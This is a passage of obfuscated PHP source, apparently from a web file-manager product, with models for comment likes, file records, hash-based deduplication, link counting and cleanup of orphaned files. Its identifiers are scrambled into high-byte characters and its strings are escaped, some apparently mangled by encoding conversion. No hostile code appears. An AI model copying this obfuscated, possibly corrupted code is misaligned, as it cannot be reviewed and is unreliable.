array($×Šé›ùÈ[2172] => $…‚Ş’£‘); $§Á‰»¸† = $this->where($ÍÑÆËÃ‡)->find(); $Äóéò®å = _get($§Á‰»¸†, $×Šé›ùÈ[2167], 0); $šÚ•×³ = array($×Šé›ùÈ[334] => $Äóéò®å, $×Šé›ùÈ[2171] => array()); if (!$Äóéò®å) { return $šÚ•×³; } $’šô»®Ÿ = Model($×Šé›ùÈ[2173])->field($×Šé›ùÈ[1542])->where($ÍÑÆËÃ‡)->limit(500)->select(); $’šô»®Ÿ = array_to_keyvalue($’šô»®Ÿ, $×Šé›ùÈ[12], $×Šé›ùÈ[1542]); $šÚ•×³[$×Šé›ùÈ[2171]] = Model($×Šé›ùÈ[594])->userListInfo($’šô»®Ÿ); return $šÚ•×³; } public function remove($Øè™¤ŸË) { $Ãí†õ‚ =& $_SERVER[±Ö‰ô½¯]; $Ë‰ï÷§² = array($Ãí†õ‚[2165] => $Øè™¤ŸË); $ äıî÷ê = $this->where($Ë‰ï÷§²)->find(); if ($ äıî÷ê[$Ãí†õ‚[2164]]) { $this->where(array($Ãí†õ‚[2165] => $ äıî÷ê[$Ãí†õ‚[2164]]))->setAdd($Ãí†õ‚[2166], -1); } return $this->removeArray($Øè™¤ŸË); } public function edit($ªáßŸâ, $´Á«’õÍ) { $ŞÚ‹¢ù÷ =& $_SERVER[±Ö‰ô½¯]; $øªŸ¦ìÂ = array($ŞÚ‹¢ù÷[2165] => $ªáßŸâ); return $this->where($øªŸ¦ìÂ)->save(array($ŞÚ‹¢ù÷[2174] => $´Á«’õÍ)); } public function prasise($óŠÔÒü—) { $ú¶Ï¢ÂÙ =& $_SERVER[±Ö‰ô½¯]; $Ÿ—”ÆÒ’ = Model($ú¶Ï¢ÂÙ[2175]); $õì„ú‡… = array($ú¶Ï¢ÂÙ[2165] => $óŠÔÒü—, $ú¶Ï¢ÂÙ[1921] => USER_ID); $Ñê¤è—ï = $Ÿ—”ÆÒ’->where($õì„ú‡…)->find(); if (!$Ñê¤è—ï) { $Ÿ—”ÆÒ’->add($õì„ú‡…); $©Í‰³ö = $this->where(array($ú¶Ï¢ÂÙ[2165] => $óŠÔÒü—))->setAdd($ú¶Ï¢ÂÙ[2167], 1); } else { $Ÿ—”ÆÒ’->where($õì„ú‡…)->delete(); $©Í‰³ö = $this->where(array($ú¶Ï¢ÂÙ[2165] => $óŠÔÒü—))->setAdd($ú¶Ï¢ÂÙ[2167], -1); } return $©Í‰³ö; } public function targetInfo($ ¤Òâ˜¼, $œÏúµ¥ò) { $ç®ú‰êâ =& $_SERVER[±Ö‰ô½¯]; $Ôí…»õ¢ = array($ç®ú‰êâ[668] => $ ¤Òâ˜¼, $ç®ú‰êâ[669] => $œÏúµ¥ò); $æ²á›ûì = $this->where($Ôí…»õ¢)->count(); $š£…Óç = "\122\x49\107\110\x54\x20\x4a\117\111\116\40{$this->tablePrefix}\143\x6f\155\x6d\145\156\x74\137\x70\162\x61\x69\163\x65\x20\x73\164\x61\162\x20\x6f\156\40\x63\157\155\x6d\145\156\164\56\143\157\x6d\155\x65\156\164\111\104\40\75\x20\163\x74\x61\x72\56\x63\x6f\155\x6d\145\x6e\164\111\x44"; $¡ Šî‡– = $this->alias($ç®ú‰êâ[431])->where($Ôí…»õ¢)->join($š£…Óç, $ç®ú‰êâ[2176])->count(); $ÉÁë¬æí = array($ç®ú‰êâ[2177] => $æ²á›ûì, $ç®ú‰êâ[2178] => $¡ Šî‡–); return $ÉÁë¬æí; } public function listData($³ßÌ–Ö¤) { $‰õË“¨ã =& $_SERVER[±Ö‰ô½¯]; if (isset($³ßÌ–Ö¤[$‰õË“¨ã[2179]])) { if ($³ßÌ–Ö¤[$‰õË“¨ã[2179]]) { $³ßÌ–Ö¤[$‰õË“¨ã[2172]] = array($‰õË“¨ã[1130], intval($³ßÌ–Ö¤[$‰õË“¨ã[2179]])); } unset($³ßÌ–Ö¤[$‰õË“¨ã[2179]]); } if (isset($³ßÌ–Ö¤[$‰õË“¨ã[2180]])) { if ($³ßÌ–Ö¤[$‰õË“¨ã[2180]]) { $³ßÌ–Ö¤[$‰õË“¨ã[2172]] = array($‰õË“¨ã[1127], intval($³ßÌ–Ö¤[$‰õË“¨ã[2180]])); } unset($³ßÌ–Ö¤[$‰õË“¨ã[2180]]); } return $this->_listData($³ßÌ–Ö¤); } private function _listData($ğñºş) { $™Ì©Ù¨Ó =& $_SERVER[±Ö‰ô½¯]; $€âÃõÀ€ = $this->where($ğñºş)->_makeOrder()->selectPage(100); $this->_listAppendParent($€âÃõÀ€[$™Ì©Ù¨Ó[447]]); $this->_listAppendUser($€âÃõÀ€[$™Ì©Ù¨Ó[447]]); $this->_listAppendMeta($€âÃõÀ€[$™Ì©Ù¨Ó[447]]); return $€âÃõÀ€; } private function _makeOrder() { $ê¶İŠ¾ =& $_SERVER[±Ö‰ô½¯]; $¨æó²Ğ = array($ê¶İŠ¾[2167], $ê¶İŠ¾[2166], $ê¶İŠ¾[233]); $©Ô¼ÒŒà = Input::get($ê¶İŠ¾[541], $ê¶İŠ¾[7], $ê¶İŠ¾[509], $¨æó²Ğ); $·²‰À¹Ü = Input::get($ê¶İŠ¾[542], $ê¶İŠ¾[7], $ê¶İŠ¾[1923], array($ê¶İŠ¾[2181], $ê¶İŠ¾[537])); $†¿óŞãá = $©Ô¼ÒŒà . $ê¶İŠ¾[53] . $·²‰À¹Ü; return $this->order($†¿óŞãá); } private function _listAppendParent(&$›Èˆ¬ ó) { $˜ØË¥Ç =& $_SERVER[±Ö‰ô½¯]; $Çû×ş„ = array_unique(array_to_keyvalue($›Èˆ¬ ó, $˜ØË¥Ç[12], $˜ØË¥Ç[2164])); $Çû×ş„ = array_remove_value($Çû×ş„, $˜ØË¥Ç[230]); if (!$Çû×ş„) { return; } $ÔİåÎİ° = $this->where(array($˜ØË¥Ç[2165] => array($˜ØË¥Ç[7], $Çû×ş„)))->select(); $ÔİåÎİ° = array_to_keyvalue($ÔİåÎİ°, $˜ØË¥Ç[2172]); foreach ($›Èˆ¬ ó as &$ëÂŠÓ) { if (isset($ÔİåÎİ°[$ëÂŠÓ[$˜ØË¥Ç[2164]]])) { $ëÂŠÓ[$˜ØË¥Ç[2182]] = $ÔİåÎİ°[$ëÂŠÓ[$˜ØË¥Ç[2164]]]; } } unset($ëÂŠÓ); } private function _listAppendUser(&$ó¦ü©…) { $¢š³Â”  =& $_SERVER[±Ö‰ô½¯]; $ÂˆˆÄ½¼ = array_unique(array_to_keyvalue($ó¦ü©…, $¢š³Â” [12], $¢š³Â” [1542])); $ÂˆˆÄ½¼ = array_remove_value($ÂˆˆÄ½¼, $¢š³Â” [230]); if (count($ÂˆˆÄ½¼) == 0) { return; } foreach ($ó¦ü©… as $šÁâæ¾¸) { if (isset($šÁâæ¾¸[$¢š³Â” [2182]])) { $ÂˆˆÄ½¼[] = $šÁâæ¾¸[$¢š³Â” [2182]][$¢š³Â” [1542]]; } } $Îø£¦¢Ñ = Model($¢š³Â” [614])->userListInfo($ÂˆˆÄ½¼); foreach ($ó¦ü©… as &$šÁâæ¾¸) { $šÁâæ¾¸[$¢š³Â” [682]] = $Îø£¦¢Ñ[$šÁâæ¾¸[$¢š³Â” [1542]]]; if (isset($šÁâæ¾¸[$¢š³Â” [2182]])) { $šÁâæ¾¸[$¢š³Â” [2182]][$¢š³Â” [682]] = $Îø£¦¢Ñ[$šÁâæ¾¸[$¢š³Â” [2182]][$¢š³Â” [1542]]]; } } unset($šÁâæ¾¸); } private function _listAppendMeta(&$üÕ†€ã) { $ÇŒ”ºİÙ =& $_SERVER[±Ö‰ô½¯]; $ƒ´ ºªø = array_unique(array_to_keyvalue($üÕ†€ã, $ÇŒ”ºİÙ[12], $ÇŒ”ºİÙ[2172])); $ƒ´ ºªø = array_remove_value($ƒ´ ºªø, $ÇŒ”ºİÙ[230]); if (!$ƒ´ ºªø) { return; } foreach ($üÕ†€ã as $ÒúóÍ†) { if (isset($ÒúóÍ†[$ÇŒ”ºİÙ[2182]])) { $ƒ´ ºªø[] = $ÒúóÍ†[$ÇŒ”ºİÙ[2182]][$ÇŒ”ºİÙ[2172]]; } } $‘ü³Ğ¨Ï = $this->metaList($ƒ´ ºªø); if (!$‘ü³Ğ¨Ï) { return !1; } foreach ($üÕ†€ã as &$ÒúóÍ†) { $ÒúóÍ†[$ÇŒ”ºİÙ[552]] = $‘ü³Ğ¨Ï[$ÒúóÍ†[$ÇŒ”ºİÙ[2172]]]; if (isset($ÒúóÍ†[$ÇŒ”ºİÙ[2182]])) { $ÒúóÍ†[$ÇŒ”ºİÙ[2182]][$ÇŒ”ºİÙ[552]] = $‘ü³Ğ¨Ï[$ÒúóÍ†[$ÇŒ”ºİÙ[2182]][$ÇŒ”ºİÙ[2172]]]; } } unset($ÒúóÍ†); } private function metaList($™Ï”†Œ´) { $œÜ×ªší =& $_SERVER[±Ö‰ô½¯]; if (!$™Ï”†Œ´) { return array(); } $²“¿‘ø = array($œÜ×ªší[2172] => array($œÜ×ªší[7], $™Ï”†Œ´)); $Û‚Â˜÷ş = Model($œÜ×ªší[2183])->where($²“¿‘ø)->select(); $Û‚Â˜÷ş = array_to_keyvalue_group($Û‚Â˜÷ş, $œÜ×ªší[2172]); foreach ($Û‚Â˜÷ş as $©•üÙÃ… => $á‚à†Ÿö) { $€°îÎìó = array(); foreach ($á‚à†Ÿö as $ùêŸ—êú) { $€°îÎìó[$ùêŸ—êú[$œÜ×ªší[95]]] = $ùêŸ—êú[$œÜ×ªší[452]]; } $Û‚Â˜÷ş[$©•üÙÃ…] = $€°îÎìó; } return $Û‚Â˜÷ş ? $Û‚Â˜÷ş : array(); } public function removeTarget($áş†ÕÈ, $É§³ş˜³) { $à–êÉà =& $_SERVER[±Ö‰ô½¯]; if (!$É§³ş˜³) { return !0; } $É§³ş˜³ = is_array($É§³ş˜³) ? $É§³ş˜³ : array($É§³ş˜³); $¬‚­éæ = array($à–êÉà[190] => $áş†ÕÈ, $à–êÉà[586] => array($à–êÉà[7], $É§³ş˜³)); $‚áãÓì» = $this->field($à–êÉà[2172])->where($¬‚­éæ)->select(); $ËßÑÂö = array_to_keyvalue($‚áãÓì», $à–êÉà[12], $à–êÉà[2172]); return $this->removeArray($ËßÑÂö); } public function removeArray($¼”ŠãÕ) { $á½“­Û =& $_SERVER[±Ö‰ô½¯]; if (!$¼”ŠãÕ) { return !0; } $¼”ŠãÕ = is_array($¼”ŠãÕ) ? $¼”ŠãÕ : array($¼”ŠãÕ); $îÑ¯ò˜± = array($á½“­Û[2172] => array($á½“­Û[7], $¼”ŠãÕ)); Model($á½“­Û[2175])->where($îÑ¯ò˜±)->delete(); Model($á½“­Û[2184])->where($îÑ¯ò˜±)->delete(); return $this->where($îÑ¯ò˜±)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\x66\x69\154\145\x5f\143\157\x6e\x74\x65\156\x74\x73"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\124\151\x6d\145", "\164\151\155\x65", "\x69\x6e\x73\145\x72\x74", "\x66\x75\156\x63\x74\x69\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\x69\x6c\x65"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\141\155\145" => "\x69\157\137\x66\151\x6c\145\137\155\145\164\x61", "\155\145\164\x61\x46\x69\x65\154\144" => "\x66\x69\x6c\x65\111\104"); public function fileInfo($Û¥™£ıÅ) { $½®ò¹Ê´ =& $_SERVER[±Ö‰ô½¯]; static $ÏŸÅÁ§š = array(); if (!isset($ÏŸÅÁ§š[$Û¥™£ıÅ])) { $›ˆŞìé® = $½®ò¹Ê´[2185]; $ÆıïÈÁç = Model($½®ò¹Ê´[557])->field($›ˆŞìé®)->where(array($½®ò¹Ê´[555] => $Û¥™£ıÅ))->find(); $ÏŸÅÁ§š[$Û¥™£ıÅ] = $ÆıïÈÁç; } return $ÏŸÅÁ§š[$Û¥™£ıÅ]; } public function addFileByContent($ìÕŒ©€ƒ = '', $‡îşÈé, $³Ùäµ–¥ = '') { $…äİƒªï =& $_SERVER[±Ö‰ô½¯]; $€«‹§À¸ = TEMP_PATH . $…äİƒªï[2186]; if (!is_dir($€«‹§À¸)) { mk_dir($€«‹§À¸); } $«¨ø¾“ = $€«‹§À¸ . $…äİƒªï[2187] . rand_string(16); $õ…¡×ÂÇ = file_put_contents($«¨ø¾“, $ìÕŒ©€ƒ); if ($õ…¡×ÂÇ === !1 || strlen($ìÕŒ©€ƒ) != $õ…¡×ÂÇ) { return !1; } $ËæÊ³ÂÃ = $this->addFile($«¨ø¾“, $‡îşÈé, $³Ùäµ–¥, !0); if (file_exists($«¨ø¾“)) { @unlink($«¨ø¾“); } return $ËæÊ³ÂÃ; } public function createFileName($…¸Ç¬é, $ÖÛÅøÌØ, $êç‚òº¸ = false, $Ì¦±‡ç± = false) { $ˆ¯í¡¼ =& $_SERVER[±Ö‰ô½¯]; $ÏÔ¯°®Å = IO::init($ˆ¯í¡¼[8]); $Îïİ‹¾¶ = $this->_makeFilePath($…¸Ç¬é, $ÖÛÅøÌØ, $ÏÔ¯°®Å, $êç‚òº¸, $Ì¦±‡ç±); $èÃ˜Ù–ª = $ÏÔ¯°®Å->pathFather($Îïİ‹¾¶); static $„²ûÉ¦Ç = false; $¥àÓã‘ = $ˆ¯í¡¼[2188] . md5($èÃ˜Ù–ª); if (!$„²ûÉ¦Ç && !Cache::get($¥àÓã‘)) { $„²ûÉ¦Ç = !0; $ïÎ–ñ¦ = IO::mkdir($èÃ˜Ù–ª); if (!IO::exist($ïÎ–ñ¦ . $ˆ¯í¡¼[899])) { IO::mkfile($ïÎ–ñ¦ . $ˆ¯í¡¼[899]); } Cache::set($¥àÓã‘, 1, 3600 * 2); } return $Îïİ‹¾¶; } public function _makeFilePath($î¡£Ï›¹, $«ó½·¦Í, $‹Ö“£è§, $ó‘†ûÕ = false, $’ãˆà = false) { $ªòíæÃ¾ =& $_SERVER[±Ö‰ô½¯]; $ìÀ»ˆÏ = Model($ªòíæÃ¾[870])->get($ªòíæÃ¾[2189]); $çˆí¿²Ø = $ªòíæÃ¾[1374] . $«ó½·¦Í[$ªòíæÃ¾[484]] . $ªòíæÃ¾[496] . date($ªòíæÃ¾[2190]); $¥ÚèÌ« = $çˆí¿²Ø . rand_string(5) . short_id(100); $î¡£Ï›¹ = str_replace($ªòíæÃ¾[8], $ªòíæÃ¾[11], KodIO::clear($î¡£Ï›¹)); $°­ä¸ê = $‹Ö“£è§->ext($î¡£Ï›¹); if (!$î¡£Ï›¹) { $ìÀ»ˆÏ = $ªòíæÃ¾[876]; } switch ($ìÀ»ˆÏ) { case $ªòíæÃ¾[2191]: if ($°­ä¸ê) { $¥ÚèÌ« = $¥ÚèÌ« . $ªòíæÃ¾[10] . $°­ä¸ê; } if ($°­ä¸ê == $ªòíæÃ¾[2129]) { $¥ÚèÌ« .= $ªòíæÃ¾[1343]; } break; case $ªòíæÃ¾[2192]: $¬ı‚õ©ê = Model($ªòíæÃ¾[870])->get($ªòíæÃ¾[871]); $É‹äœŞÚ = substr(md5($ªòíæÃ¾[872] . $¬ı‚õ©ê . date($ªòíæÃ¾[846])), 0, 8); $çˆí¿²Ø = $ªòíæÃ¾[1374] . $«ó½·¦Í[$ªòíæÃ¾[484]] . $ªòíæÃ¾[496] . date($ªòíæÃ¾[2193]) . $É‹äœŞÚ . $ªòíæÃ¾[8]; if ($°­ä¸ê == $ªòíæÃ¾[2129]) { $î¡£Ï›¹ .= $ªòíæÃ¾[1343]; } $«ğóËÚÆ = $ªòíæÃ¾[2194] . $çˆí¿²Ø . $î¡£Ï›¹; CacheLock::lock($«ğóËÚÆ); $¥ÚèÌ« = $çˆí¿²Ø . $î¡£Ï›¹; if (IO::exist($çˆí¿²Ø . $î¡£Ï›¹)) { $’À¡¯Í­ = substr($î¡£Ï›¹, 0, strlen($î¡£Ï›¹) - strlen($°­ä¸ê)); $Ã¼ÚïÁ‰ = $’ãˆà ? substr($’ãˆà, 0, 5) : ($ó‘†ûÕ ? substr($ó‘†ûÕ, 0, 5) : rand_string(5)); $Ã¼ÚïÁ‰ .= rand_string(3); $¥ÚèÌ« = $çˆí¿²Ø . $’À¡¯Í­ . $Ã¼ÚïÁ‰; if ($°­ä¸ê) { $¥ÚèÌ« = $¥ÚèÌ« . $ªòíæÃ¾[10] . $°­ä¸ê; } } if (IO::isOsDriver($¥ÚèÌ«) && !IO::isUploadServer($¥ÚèÌ«)) { if (IO::exist($¥ÚèÌ«)) { CacheLock::unlock($«ğóËÚÆ); return $¥ÚèÌ«; } $ŸÜ•˜¨¬ = IO::setContent($¥ÚèÌ«, $ªòíæÃ¾[12]); if (!$ŸÜ•˜¨¬) { show_json($ªòíæÃ¾[2195], !1); } } CacheLock::unlock($«ğóËÚÆ); break; case $ªòíæÃ¾[876]: break; default: break; } return $¥ÚèÌ«; } public function addFileByRemote($ï’é¶ö×, $¿“”á’, $¦ş¸‚¹è = array()) { $ö©€€Ô =& $_SERVER[±Ö‰ô½¯]; if (!IO::isFile($ï’é¶ö×)) { return !1; } $¯Çâ˜ ” = $¦ş¸‚¹è[$ö©€€Ô[560]] ? $¦ş¸‚¹è[$ö©€€Ô[560]] : $ö©€€Ô[12]; $Æ¶Ù„Œ = IO::hashMd5($ï’é¶ö×, $¯Çâ˜ ”); $ª½ãˆ¦Ñ = KodIO::parse($ï’é¶ö×); $œ•­«È = array($ö©€€Ô[637] => IO::size($ï’é¶ö×), $ö©€€Ô[2196] => 1, $ö©€€Ô[506] => $¿“”á’, $ö©€€Ô[913] => $ª½ãˆ¦Ñ[$ö©€€Ô[484]], $ö©€€Ô[507] => $ï’é¶ö×, $ö©€€Ô[2197] => $¦ş¸‚¹è[$ö©€€Ô[692]] ? $¦ş¸‚¹è[$ö©€€Ô[692]] : IO::hashSimple($ï’é¶ö×), $ö©€€Ô[2198] => $Æ¶Ù„Œ ? $Æ¶Ù„Œ : $¯Çâ˜ ”); if ($ŸÁŸŸòÙ = $this->addFileCheckExist($œ•­«È[$ö©€€Ô[692]], $œ•­«È[$ö©€€Ô[560]], $œ•­«È[$ö©€€Ô[79]])) { return $ŸÁŸŸòÙ; } return $this->addFileData($œ•­«È); } private function addFileData($“¥Û‚…Ê) { $İñ½Ï“Œ =& $_SERVER[±Ö‰ô½¯]; if (!$“¥Û‚…Ê) { return !1; } if (!IO::isFile($“¥Û‚…Ê[$İñ½Ï“Œ[87]])) { return !1; } $“¥Û‚…Ê[$İñ½Ï“Œ[79]] = intval($“¥Û‚…Ê[$İñ½Ï“Œ[79]]); if (!$“¥Û‚…Ê[$İñ½Ï“Œ[79]] && strlen($“¥Û‚…Ê[$İñ½Ï“Œ[692]]) > 32) { $“¥Û‚…Ê[$İñ½Ï“Œ[79]] = intval(substr($“¥Û‚…Ê[$İñ½Ï“Œ[692]], 32)); } $úçé­ÄÍ = $this->add($“¥Û‚…Ê); return $this->find($úçé­ÄÍ); } public function addFile($åÁé˜¬‘, $Òí’ã°, $ÉÆ²—¦, $Ä«–Å = false) { $¸îŸ€± =& $_SERVER[±Ö‰ô½¯]; $ÃñœÍÆ® = IO::hashSimple($åÁé˜¬‘); $ûæÃÅï“ = IO::size($åÁé˜¬‘); $„„‹î¹ø = $ûæÃÅï“ <= 1024 * 1024 * 10 ? IO::hashMd5($åÁé˜¬‘) : $¸îŸ€±[12]; $‹ç…ÓÔı = $¸îŸ€±[2199] . $ÃñœÍÆ®; CacheLock::lock($‹ç…ÓÔı); if ($„„‹î¹ø && $ÃñœÍÆ®) { $©´ŞşÛ¤ = $this->addFileCheckExist($ÃñœÍÆ®, $„„‹î¹ø, $ûæÃÅï“); if ($©´ŞşÛ¤) { CacheLock::unlock($‹ç…ÓÔı); return $©´ŞşÛ¤; } } $ÈÊ«ŸŸß = $this->addFileMake($åÁé˜¬‘, $Òí’ã°, $ûæÃÅï“, $ÃñœÍÆ®, $„„‹î¹ø, $ÉÆ²—¦, $Ä«–Å); $¡ë¢»Î§ = $this->addFileData($ÈÊ«ŸŸß); if (!$¡ë¢»Î§) { return !1; } CacheLock::unlock($‹ç…ÓÔı); if (!$„„‹î¹ø && $¡ë¢»Î§) { $this->fileMd5Check($¡ë¢»Î§); } return $¡ë¢»Î§; } public function fileMd5Check($â¾ÀˆÀ) { $°ŒÏŠÛ„ =& $_SERVER[±Ö‰ô½¯]; $¯É›£˜ = array($â¾ÀˆÀ[$°ŒÏŠÛ„[554]], $â¾ÀˆÀ[$°ŒÏŠÛ„[87]]); $¯‹¹Ú Ş = $°ŒÏŠÛ„[2200] . $â¾ÀˆÀ[$°ŒÏŠÛ„[87]]; $“¬Ô«Æ¢ = $°ŒÏŠÛ„[2201] . $â¾ÀˆÀ[$°ŒÏŠÛ„[554]]; TaskQueue::add($°ŒÏŠÛ„[2202], $¯É›£˜, $¯‹¹Ú Ş, $“¬Ô«Æ¢); } public function fileMd5Set($é×˜­—Ğ, $ğ§É‰†) { $ö´„Ã‹ =& $_SERVER[±Ö‰ô½¯]; $øè Û×ª = $this->find($é×˜­—Ğ); if (!$øè Û×ª || $øè Û×ª[$ö´„Ã‹[560]]) { return; } $ğ×ŸİÔÊ = IO::hashMd5($ğ§É‰†); if (!$ğ×ŸİÔÊ) { return $ö´„Ã‹[12]; } $this->where(array($ö´„Ã‹[554] => $é×˜­—Ğ))->save(array($ö´„Ã‹[560] => $ğ×ŸİÔÊ)); } public function addFileMake($­™™àÏŞ, $µôÚæœğ, $¦ŞíÇÙ©, $Şüşëà, $³îÏÚÆ, $ËºÎ›„¡, $Û…‹‚É) { $òÓ¢ØÄª =& $_SERVER[±Ö‰ô½¯]; $Í´¥å¥ = $this->createFileName($ËºÎ›„¡, $µôÚæœğ, $Şüşëà, $³îÏÚÆ); $ÒŸåæ×¤ = get_path_father($Í´¥å¥); $§àÌ­Š¼ = get_path_this($Í´¥å¥); if ($Û…‹‚É) { $ÊÉ‘€’ı = IO::move($­™™àÏŞ, $ÒŸåæ×¤, !1, $§àÌ­Š¼); } else { $ÊÉ‘€’ı = IO::copy($­™™àÏŞ, $ÒŸåæ×¤, !1, $§àÌ­Š¼); } if (!$ÊÉ‘€’ı) { return !1; } $¬Ô•ùÁ¯ = IO::init($ÊÉ‘€’ı); $¬Ô•ùÁ¯->cacheMethod($òÓ¢ØÄª[181], $¬Ô•ùÁ¯->path, $òÓ¢ØÄª[178]); if (IO::size($ÊÉ‘€’ı) != $¦ŞíÇÙ©) { return !1; } $›Ãè¨˜¿ = array($òÓ¢ØÄª[637] => $¦ŞíÇÙ©, $òÓ¢ØÄª[2196] => 1, $òÓ¢ØÄª[506] => $ËºÎ›„¡, $òÓ¢ØÄª[913] => $µôÚæœğ[$òÓ¢ØÄª[484]], $òÓ¢ØÄª[507] => $Í´¥å¥, $òÓ¢ØÄª[2197] => $Şüşëà, $òÓ¢ØÄª[2198] => $³îÏÚÆ); return $›Ãè¨˜¿; } public function addFileCheckExist($ÊÃĞ£Š”, $¬…ğ›˜„, $¶ß»°Ä›) { $¿×®¤¶ =& $_SERVER[±Ö‰ô½¯]; $Ä÷„È§‹ = $this->findByHash($ÊÃĞ£Š”, $¬…ğ›˜„); if (!$Ä÷„È§‹) { return !1; } $¢‘â±õÙ = array($¿×®¤¶[2196] => intval($Ä÷„È§‹[$¿×®¤¶[2203]]) + 1, $¿×®¤¶[637] => $¶ß»°Ä›); $this->where(array($¿×®¤¶[555] => $Ä÷„È§‹[$¿×®¤¶[554]]))->save($¢‘â±õÙ); return $Ä÷„È§‹; } public function remove($òˆ‰æğ•) { $this->linkCountChange($òˆ‰æğ•, !1); $this->clearEmpty(); return !0; } public function linkAdd($ÙüöÒ“ğ) { $this->linkCountChange($ÙüöÒ“ğ, !0); } public function linkCountChange($›‘ş±Æ, $ŒŞÆ‰¤¬) { $éƒÅô¼ =& $_SERVER[±Ö‰ô½¯]; if (!$›‘ş±Æ) { return; } if (!is_array($›‘ş±Æ)) { $›‘ş±Æ = array($›‘ş±Æ); } $ã¯¥ûå = array(); foreach ($›‘ş±Æ as $’ÖÛÄÅ±) { $÷öƒ™µı = $’ÖÛÄÅ± . $éƒÅô¼[12]; if (!$ã¯¥ûå[$÷öƒ™µı]) { $ã¯¥ûå[$÷öƒ™µı] = 0; } $ã¯¥ûå[$÷öƒ™µı]++; } $„¿®î†¾ = array(); foreach ($ã¯¥ûå as $’ÖÛÄÅ± => $ÒäœÄÛ) { $÷öƒ™µı = $ÒäœÄÛ . $éƒÅô¼[12]; if (!$„¿®î†¾[$÷öƒ™µı]) { $„¿®î†¾[$÷öƒ™µı] = array(); } $„¿®î†¾[$÷öƒ™µı][] = $’ÖÛÄÅ±; } foreach ($„¿®î†¾ as $ÒäœÄÛ => $ºßÂ•Á) { if (!$ºßÂ•Á) { continue; } $ÒäœÄÛ = $ŒŞÆ‰¤¬ ? $ÒäœÄÛ : -intval($ÒäœÄÛ); $º¢¢Ñ§° = array($éƒÅô¼[554] => array($éƒÅô¼[7], $ºßÂ•Á)); if ($ÒäœÄÛ < 0) { $º¢¢Ñ§°[$éƒÅô¼[2203]] = array($éƒÅô¼[1131], abs($ÒäœÄÛ)); } $this->where($º¢¢Ñ§°)->setAdd($éƒÅô¼[2203], $ÒäœÄÛ); } } public function findByHash($¬ÑÔÍ­ò, $êõ¼Õğ¿ = false) { $›×íÔÃÜ =& $_SERVER[±Ö‰ô½¯]; if (!$¬ÑÔÍ­ò && !$êõ¼Õğ¿) { return !1; } $€„‡ó¡ = array($›×íÔÃÜ[2197] => $¬ÑÔÍ­ò); if ($êõ¼Õğ¿) { $€„‡ó¡ = array($›×íÔÃÜ[2198] => $êõ¼Õğ¿); } return $this->order($›×íÔÃÜ[2204])->where($€„‡ó¡)->find(); } public function clearEmpty($’ƒ“±¡­ = 1) { $‘¨‡Ãø¬ =& $_SERVER[±Ö‰ô½¯]; $ğ¼Ç“ˆù = time() - 3600 * 24 * $’ƒ“±¡­; $ë¢˜£Ç = $‘¨‡Ãø¬[2205] . $ğ¼Ç“ˆù; $Ë‰ÇÏ€› = $this->where($ë¢˜£Ç)->select(); if (!$Ë‰ÇÏ€›) { return; } $í¤ùå”İ = new Task($‘¨‡Ãø¬[2206], $‘¨‡Ãø¬[12], count($Ë‰ÇÏ€›)); foreach ($Ë‰ÇÏ€› as $’’øÎæ¯) { $í¤ùå”İ->update(1); $this->resetFile($’’øÎæ¯); } $í¤ùå”İ->end(); } public function resetFile($Ô”÷ÊäÁ) { $ÓÚıñÂ¥ =& $_SERVER[±Ö‰ô½¯]; $Ú³ïæéÈ = array($ÓÚıñÂ¥[555] => $Ô”÷ÊäÁ[$ÓÚıñÂ¥[554]]); $¾ÙÒÄŸË = Model($ÓÚıñÂ¥[1482])->where($Ú³ïæéÈ)->count(); $®®ôÓ¤æ = Model($ÓÚıñÂ¥[2207])->where($Ú³ïæéÈ)->count(); $æ¹²µìÏ = intval($¾ÙÒÄŸË) + intval($®®ôÓ¤æ); if ($æ¹²µìÏ == 0) { Model($ÓÚıñÂ¥[2208])->delete($Ô”÷ÊäÁ[$ÓÚıñÂ¥[554]]); $this->where($Ú³ïæéÈ)->delete(); $this->metaSet($Ô”÷ÊäÁ[$ÓÚıñÂ¥[554]], null, null); if (!IO::isFile($Ô”÷ÊäÁ[$ÓÚıñÂ¥[87]])) { write_log(array($ÓÚıñÂ¥[2209], ACTION, $Ô”÷ÊäÁ), $ÓÚıñÂ¥[1317]); return !1; } IO::remove($Ô”÷ÊäÁ[$ÓÚıñÂ¥[87]]); write_log(ACTION . $ÓÚıñÂ¥[938] . KodUser::id() . $ÓÚıñÂ¥[2210] . $Ô”÷ÊäÁ[$ÓÚıñÂ¥[554]] . $ÓÚıñÂ¥[1999] . $Ô”÷ÊäÁ[$ÓÚıñÂ¥[79]] . $ÓÚıñÂ¥[201] . $Ô”÷ÊäÁ[$ÓÚıñÂ¥[87]], $ÓÚıñÂ¥[2209]); return; } if ($Ô”÷ÊäÁ[$ÓÚıñÂ¥[2203]] != $æ¹²µìÏ) { $this->where($Ú³ïæéÈ)->save(array($ÓÚıñÂ¥[2196] => $æ¹²µìÏ)); } } public function storageInfo($”†‘´´ñ = false) { $»Î²ô©÷ =& $_SERVER[±Ö‰ô½¯]; $ò‘ÌÕß¬ = $this->count() + 0.0; $É¯¯‹² = 0; $Šã¹„«¸ = 1; $Ò¯©¾ë = 0; $ıÚ´Œáô = 5000; for ($Ò°ÍŒË = 0; $Ò°ÍŒË < $ò‘ÌÕß¬; $Ò°ÍŒË = $Ò°ÍŒË + $ıÚ´Œáô) { $îÔäÍÄ¯ = $this->limit($Ò°ÍŒË, $Ò°ÍŒË + $ıÚ´Œáô)->select(); foreach ($îÔäÍÄ¯ as $»€Îê€) { $Šã¹„«¸ += $»€Îê€[$»Î²ô©÷[79]] * $»€Îê€[$»Î²ô©÷[2203]]; $É¯¯‹² += $»€Îê€[$»Î²ô©÷[79]] * ($»€Îê€[$»Î²ô©÷[2203]] - 1); $Ò¯©¾ë += $»€Îê€[$»Î²ô©÷[2203]]; } } $·¦™®ÚÉ = array($»Î²ô©÷[2211] => $Šã¹„«¸, $»Î²ô©÷[2212] => $É¯¯‹², $»Î²ô©÷[2213] => $É¯¯‹² / $Šã¹„«¸, $»Î²ô©÷[83] => $ò‘ÌÕß¬, $»Î²ô©÷[2214] => $Ò¯©¾ë); return $·¦™®ÚÉ; } } goto D„™¤Ú¡Ê; a¾‡»ºŞ¬×: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Ë«‹ğ½‡) { $é÷îªã³ =& $_SERVER[±Ö‰ô½¯]; parent::__construct($Ë«‹ğ½‡); $ô±©îÚ = 